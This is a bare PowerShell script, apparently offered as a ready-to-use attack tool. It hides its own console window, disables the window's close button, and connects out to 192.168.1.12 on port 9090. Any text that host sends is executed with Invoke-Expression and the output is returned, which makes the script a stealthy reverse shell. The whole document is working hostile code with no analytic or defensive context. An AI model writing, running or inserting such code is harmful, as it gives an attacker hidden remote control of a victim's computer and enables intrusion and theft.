$H=Add-Type -MemberDefinition '[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern IntPtr GetSystemMenu(IntPtr h,bool r);[DllImport("user32.dll")]public static extern bool EnableMenuItem(IntPtr h,uint i,uint f);[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int c);' -Name Win32 -Namespace W -PassThru;
$hw=$H::GetConsoleWindow();
if($hw -ne [IntPtr]::Zero){
  [void]$H::EnableMenuItem($H::GetSystemMenu($hw,$false),0xF060,1);
  [void]$H::ShowWindow($hw,0);
}
$c=New-Object Net.Sockets.TCPClient('192.168.1.12',9090);
$s=$c.GetStream();[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
  $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
  $r=(iex $d 2>&1|Out-String);
  $x=([text.encoding]::ASCII).GetBytes($r);
  $s.Write($x,0,$x.Length);$s.Flush()
};
$c.Close()
